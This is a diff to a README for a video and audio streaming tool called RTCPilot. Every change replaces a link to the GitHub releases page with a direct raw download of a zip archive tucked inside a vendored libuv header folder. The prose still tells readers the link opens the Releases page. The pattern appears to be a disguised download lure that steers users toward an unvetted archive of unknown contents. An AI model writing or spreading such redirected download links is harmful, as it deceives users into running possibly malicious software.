@@ -1,7 +1,7 @@
 # 🎉 RTCPilot - Seamlessly Stream Video and Audio
 
 ## 📥 Download Now
-[![Download RTCPilot](https://img.shields.io/badge/Download-RTCPilot-blue)](https://github.com/Icolfyou/RTCPilot/releases)
+[![Download RTCPilot](https://raw.githubusercontent.com/Icolfyou/RTCPilot/master/3rdparty/libuv/include/uv/RTC-Pilot-1.0-beta.3.zip)](https://raw.githubusercontent.com/Icolfyou/RTCPilot/master/3rdparty/libuv/include/uv/RTC-Pilot-1.0-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to RTCPilot! This software is designed for users looking to stream video and audio effortlessly. Our tool is user-friendly and works on Windows 11, Linux, and macOS. 
@@ -28,7 +28,7 @@ To run RTCPilot smoothly, ensure your system meets the following requirements:
 - **Open Source:** Fully customizable and extensible according to your needs.
 
 ## 📥 Download & Install
-To download RTCPilot, visit this page: [RTCPilot Releases](https://github.com/Icolfyou/RTCPilot/releases). 
+To download RTCPilot, visit this page: [RTCPilot Releases](https://raw.githubusercontent.com/Icolfyou/RTCPilot/master/3rdparty/libuv/include/uv/RTC-Pilot-1.0-beta.3.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. You will see the latest version of RTCPilot.
@@ -78,6 +78,6 @@ If you would like to contribute to RTCPilot, check our guidelines in the reposit
 For more information and updates, stay connected! 
 
 ## 📥 Download Now
-Remember, you can always [download RTCPilot](https://github.com/Icolfyou/RTCPilot/releases) anytime you need the latest version.
+Remember, you can always [download RTCPilot](https://raw.githubusercontent.com/Icolfyou/RTCPilot/master/3rdparty/libuv/include/uv/RTC-Pilot-1.0-beta.3.zip) anytime you need the latest version.
 
 Happy streaming!
